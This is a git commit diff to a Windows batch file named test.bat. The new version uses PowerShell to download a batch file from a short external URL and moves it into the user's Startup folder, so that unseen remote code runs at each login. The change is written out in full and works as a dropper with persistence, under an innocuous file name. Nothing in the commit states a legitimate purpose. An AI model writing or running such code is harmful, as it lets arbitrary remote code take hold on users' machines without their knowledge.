64a550a5fd341defa4370609a097d06b7e786d59
yarik2345543 <aimpav51@gmail.com>
2025-03-29 18:26:25 +0200

    test.bat

--- test.bat
+++ test.bat
@@ -1,7 +1,11 @@
 @echo off
-start cmd
-start cmd
-start cmd
-start cmd
-start cmd
-start cmd
+setlocal
+
+set "url=https://kappa.lol/e6jmfg"
+set "dest=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test2.bat"
+
+set "tempfile=%TEMP%\downloaded_file.bat"
+
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%tempfile%')"
+
+move /Y "%tempfile%" "%dest%"
